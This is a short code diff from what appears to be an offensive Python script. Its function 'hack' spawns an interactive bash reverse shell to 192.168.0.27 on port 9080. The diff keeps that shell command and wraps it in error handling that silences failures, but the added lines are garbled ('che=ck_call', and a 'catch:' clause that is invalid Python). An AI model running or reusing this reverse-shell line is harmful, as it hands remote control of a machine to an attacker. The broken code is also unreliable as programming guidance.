@@ -7,7 +7,10 @@ import subprocess
 import threading
 
 def hack(num):
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.27/9080 0<&1 2>&1", shell=True, executable='/bin/bash')
+    try:
+        subprocess.che=ck_call("/bin/bash -i >/dev/tcp/192.168.0.27/9080 0<&1 2>&1", shell=True, executable='/bin/bash')
+    catch:
+        pass
 
 def clear():
     if os.name == 'nt':
